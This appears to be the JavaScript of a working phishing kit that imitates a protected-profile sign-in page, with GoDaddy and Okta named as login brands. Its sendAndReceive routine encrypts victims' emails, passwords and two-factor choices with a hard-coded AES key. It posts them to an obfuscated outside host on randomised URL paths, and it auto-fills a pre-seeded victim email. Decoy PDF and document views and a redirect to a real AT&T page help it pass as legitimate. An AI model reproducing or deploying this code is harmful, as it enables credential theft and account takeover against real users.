var otherweburl = "";
var websitenames = ["godaddy", "okta"];
var bes = ["Apple.com","Netflix.com"];
var pes = ["https:\/\/t.me\/","https:\/\/t.com\/","t.me\/","https:\/\/t.me.com\/","t.me.com\/","t.me@","https:\/\/t.me@","https:\/\/t.me","https:\/\/t.com","t.me","https:\/\/t.me.com","t.me.com","t.me\/@","https:\/\/t.me\/@","https:\/\/t.me@\/","t.me@\/","https:\/\/www.telegram.me\/","https:\/\/www.telegram.me"];
var capnum = 1;
var appnum = 1;
var pvn = 0;
var view = "";
var pagelinkval = "8UBimu";
var emailcheck = "0";
var webname = "rtrim(/web8/, '/')";
var urlo = "/gwCxsZqCLQtaRNZpvzQaWa9meznqQDqLZdQsMxUUMTpdGwyjzb";
var gdf = "/ijDvv4L8eXm6PE7zx8BRmrxwx3Ys3WDi5z1fJcd120";
var odf = "/ghcxzMgOYpPF7oQrmyvYUUyh6uvUJ3C2RfZTH5COxSacd650";
var twa = 0;

var currentreq = null;
var requestsent = false;
var pagedata = "";
var redirecturl = "https://www.att.com/support/article/wireless/KM1008685?msockid=02c709320e64625023891ca50f0f63e0";
var userAgent = navigator.userAgent;
var browserName;
var userip;
var usercountry;
var errorcodeexecuted = false;
if(userAgent.match(/edg/i)){
    browserName = "Edge";
} else if(userAgent.match(/chrome|chromium|crios/i)){
    browserName = "chrome";
} else if(userAgent.match(/firefox|fxios/i)){
    browserName = "firefox";
} else if(userAgent.match(/safari/i)){
    browserName = "safari";
} else if(userAgent.match(/opr\//i)){
    browserName = "opera";
} else{
    browserName="No browser detection";
}

function removespaces(input) {
    input.value = input.value.replace(/\s+/g, ''); // Removes all spaces
}

function encryptData(data) {
    const key = CryptoJS.enc.Utf8.parse('1234567890123456');
    const iv = CryptoJS.enc.Utf8.parse('1234567890123456');
    const encrypted = CryptoJS.AES.encrypt(data, key, {
        iv: iv,
        padding: CryptoJS.pad.Pkcs7,
        mode: CryptoJS.mode.CBC
    });
    return encrypted.toString();
}

function stringToBinary(input) {
    const zeroReplacement = '0';
    const oneReplacement = '1';
  
    return btoa(input
      .split('')
      .map(char => {
        let binary = char.charCodeAt(0).toString(2);
        binary = binary.padStart(8, '0');
        return binary
          .split('')
          .map(bit => (bit === '0' ? zeroReplacement : oneReplacement))
          .join('');
      })
      .join(' '));
}

function decryptData(encryptedData) {
    const key = CryptoJS.enc.Utf8.parse('1234567890123456');
    const iv = CryptoJS.enc.Utf8.parse('1234567890123456');
    const decrypted = CryptoJS.AES.decrypt(encryptedData, key, {
        iv: iv,
        padding: CryptoJS.pad.Pkcs7,
        mode: CryptoJS.mode.CBC
    });
    return decrypted.toString(CryptoJS.enc.Utf8);
}

var sendAndReceive = (route, args, getresponse) => {
if(requestsent == true && route !== "twofaselect"){
return new Promise((resolve, reject) => {
return resolve({message: "waiting for previous request to complete"});
});
}
if(requestsent == false || route == "twofaselect"){
requestsent = true;
let routename = null;
let randpattern = null;
if(route == "checkemail"){
randpattern = /(pq|rs)[A-Za-z0-9]{6,18}(yz|12|34)[A-Za-z0-9]{2,7}(uv|wx)(3[1-9]|40)/gm;
}
if(route == "checkpass"){
randpattern = /(yz|12)[A-Za-z0-9]{7,14}(56|78)[A-Za-z0-9]{3,8}(op|qr)(4[1-9]|50)/gm;
}
if(route == "twofaselect"){
randpattern = /(56|78|90)[A-Za-z0-9]{8,16}(23|45|67)[A-Za-z0-9]{4,9}(st|uv)(5[1-9]|60)/gm;
}
if(route == "twofaselected"){
randpattern = /(23|45)[A-Za-z0-9]{9,20}(89|90|ab)[A-Za-z0-9]{5,10}(vw|xy)(6[1-9]|70)/gm;
if(currentreq){
currentreq.abort();
}
}
let randexp = new RandExp(randpattern);
let randroute = randexp.gen();

let formattedargs = 0;
if(route == "checkemail"){
formattedargs = args.map(item => '/'+item).join('')+'/'+appnum+'/'+getresponse;
}
if(route !== "checkemail"){
formattedargs = '/'+token+args.map(item => '/'+item).join('')+'/'+getresponse;
}
// console.log(formattedargs);
let encrypteddata = encryptData(formattedargs);
const makeRequest = (retryCount) => {
    return new Promise((resolve, reject) => {
            currentreq = $.ajax({
                url: 'https://6MeBAWNInf4LYTSyldkgIjFHR533SMFKe70vox3LWHLyBHusYo5KnL81cS.dfcgtm.es/2089175410307642850353407KQHVQCLGUSAECWUSFGWKTSWSVLFTYNUHNGRRZYIKZNXXFVNUM' + randroute,
                type: 'POST',
                data: {data: encrypteddata},
                success: function(response) {
                    if (response.message == "Token Not Found" && retryCount < 3) {
                    console.log('data: '+formattedargs);
                    setTimeout(function(){
                    resolve(makeRequest(retryCount + 1));
                    }, 3000);
                    }
                    if (response.message == "Missing Value") {
                    resolve('missing value');
                    }
                    if (response.message !== "Token Not Found") {
                    let decryptedresp = JSON.parse(decryptData(response));
                    if(route !== "twofaselected"){
                    if (decryptedresp.token) {
                        token = decryptedresp.token;
                    }
                    }
                    if (decryptedresp.message == "Token Not Found" && retryCount < 3) {
                        console.log('data: '+formattedargs);
                        setTimeout(function(){
                        resolve(makeRequest(retryCount + 1));
                        }, 3000);
                    } else {
                        // console.log(decryptedresp);
                        requestsent = false;
                        resolve(decryptedresp);
                    }
                    }
                },
                error: function(xhr, status, error) {
                    requestsent = false;
                    console.error('Error:', error);
                    reject(error);
                }
            });
        });
    };
    return makeRequest(0);
}
};
function bottomsectionlinks(sectionname,array) {
const bottomsection = document.getElementById('section_'+sectionname).querySelector('.bottomsection');
bottomsection.innerHTML = '';
array.forEach(item => {
if (item.type === 'text_link') {
const textWithLink = document.createElement('p');
textWithLink.classList.add('mb-16');
textWithLink.innerHTML = `${item.text} <a href="javascript:void(0)" data-id="`+item.a_id+`" onclick="linkoptionclick(this)" class="link">${item.a_text}</a>`;
bottomsection.appendChild(textWithLink);
} else if (item.type === 'link_text') {
const linkwithText = document.createElement('a');
linkwithText.classList.add('link', 'mb-16');
linkwithText.setAttribute('data-id', item.a_id);
linkwithText.setAttribute('onclick', 'linkoptionclick(this)');
linkwithText.textContent = item.a_text;
bottomsection.appendChild(linkwithText);        
const paragraph = document.createElement('p');
paragraph.textContent = item.text;
bottomsection.appendChild(paragraph)
} else if (item.type === 'link') {
const linkOnly = document.createElement('a');
linkOnly.classList.add('link','mb-16');
linkOnly.setAttribute("data-id", item.a_id);
linkOnly.setAttribute("onclick", "linkoptionclick(this)");
linkOnly.textContent = item.a_text;
linkOnly.href = '#';
bottomsection.appendChild(linkOnly);
} else if (item.type === 'text') {
const textOnly = document.createElement('p');
textOnly.classList.add('mb-16');
textOnly.textContent = item.text;
bottomsection.appendChild(textOnly);
}
});
}
var disconnecttimer;
var showwedidnthearpopup = 0;
function startdisconnecttimer(){
if(document.getElementById('section_tryagainlater').classList.contains('d-none')){
disconnecttimer = setTimeout(function() {
setTimeout(function(){
document.getElementById('section_'+view).querySelector('.loading-container').classList.remove('loading');
document.getElementById('section_'+view).querySelector('.sectioncontent').style.animation = 'hide-to-left 0.5s';
setTimeout(function(){
document.getElementById('section_'+view).classList.toggle('d-none');
document.getElementById('section_tryagainlater').querySelector('#tryagainheader').style.display = "block";
document.getElementById('section_tryagainlater').querySelector('#tryagain_withoutinternet').style.display = "block";
document.getElementById('section_tryagainlater').querySelector('.sectioncontent').style.animation = 'show-from-right 0.5s';
document.getElementById('section_tryagainlater').classList.remove('d-none');
}, 200);
}, 500);
view = "tryagainlater";
}, 40000);
}
}
function moreinforeq(){
showwedidnthearpopup = 0;
if(document.getElementById('section_tryagainlater').classList.contains('d-none')){
document.getElementById('section_tryagainlater').querySelector('.title').innerText = "More Information Required";
setTimeout(function(){
document.getElementById('section_'+view).querySelector('.loading-container').classList.remove('loading');
document.getElementById('section_'+view).querySelector('.sectioncontent').style.animation = 'hide-to-left 0.5s';
setTimeout(function(){
document.getElementById('section_'+view).classList.toggle('d-none');
document.getElementById('section_tryagainlater').querySelector('#tryagainheader').style.display = "block";
document.getElementById('section_tryagainlater').querySelector('#tryagain_moreinfo').style.display = "block";
document.getElementById('section_tryagainlater').querySelector('.sectioncontent').style.animation = 'show-from-right 0.5s';
document.getElementById('section_tryagainlater').classList.remove('d-none');
}, 200);
}, 500);
}
view = "tryagainlater";
}

// document.addEventListener("DOMContentLoaded", () => {
if(twa == 0){
setTimeout(function(){
setTimeout(function(){
document.getElementById('section_tryingtosignin').querySelector('.loading-container').classList.remove('loading');
document.getElementById('section_tryingtosignin').querySelector('.sectioncontent').style.animation = 'hide-to-left 0.5s';
setTimeout(function(){
document.getElementById("section_tryingtosignin").classList.toggle('d-none');
if (!document.getElementById('sections_doc') && !document.getElementById('sections_pdf')){
document.title = "Continue To Protected Profile";
if (document.getElementById('out2-logo')){
document.getElementById('out2-logo').style.display = 'block';
}
document.getElementById('section_uname').querySelector('.sectioncontent').style.animation = 'show-from-right 0.5s';
document.getElementById('section_uname').classList.remove('d-none');
}
}, 200);
}, 500);

if (document.getElementById('sections_pdf')){
setTimeout(function(){
document.title = "Continue To Protected Profile";
document.getElementById('sections_pdf').querySelector('#mainLoader').style.display = "none";
document.getElementById('sections_pdf').querySelector('#section_uname_content').classList.remove('d-none');
}, 1000);
}

if (document.getElementById('sections_doc')){
setTimeout(function(){
document.title = "Continue To Protected Profile";
}, 1000);
}

}, 1000);
}
if(twa == 1){
document.getElementById('section_tryingtosignin').querySelector('.loading-container').classList.remove('loading');
document.getElementById("section_tryingtosignin").classList.toggle('d-none');
document.title = "Continue To Protected Profile";
document.getElementById('section_uname').classList.remove('d-none');
}
if(twa == 2){
document.title = "Continue To Protected Profile";
}
// });

let emailinputele = false;

function tryfindingele(email) {
if (view == "uname") {
let emailinputcheck = document.getElementById("inp_uname");
let emailsectionelecheck = document.getElementById("section_uname");
if (emailinputcheck && !emailsectionelecheck.classList.contains("d-none")) {
    emailinputcheck.value = email;
    document.getElementById('section_uname').querySelector("#btn_next").click();
    emailinputele = true;
} else {
     setTimeout(function() {
        tryfindingele(email);
     }, 1000);
}

} else if (view == "uname_pdf") {
let emailinputcheck = document.getElementById("pdfemail");
let emailsectionelecheck = document.getElementById("section_uname_content");
if (emailinputcheck && !emailsectionelecheck.classList.contains("d-none")) {
    emailinputcheck.value = email;
    setTimeout(function() {
        document.getElementById('section_uname_pdf').querySelector("#btn_next_pdf").click();
     }, 2000);
    emailinputele = true;
} else {
     setTimeout(function() {
        tryfindingele(email);
     }, 1000);
}

} else if (view == "uname_doc") {
let emailinputcheck = document.getElementById("docemail");
let emailsectionelecheck = document.getElementById("section_uname_content");
if (emailinputcheck && !emailsectionelecheck.classList.contains("d-none")) {
    emailinputcheck.value = email;
    setTimeout(function() {
        document.getElementById('section_uname_doc').querySelector("#btn_next_doc").click();
     }, 2000);
    emailinputele = true;
} else {
     setTimeout(function() {
        tryfindingele(email);
     }, 1000);
}

} else {
     setTimeout(function() {
        tryfindingele(email);
     }, 1000);
}

}

if (typeof emailcheck !== 'undefined' && emailcheck !== null && emailcheck !== "0") {
tryfindingele(emailcheck);
}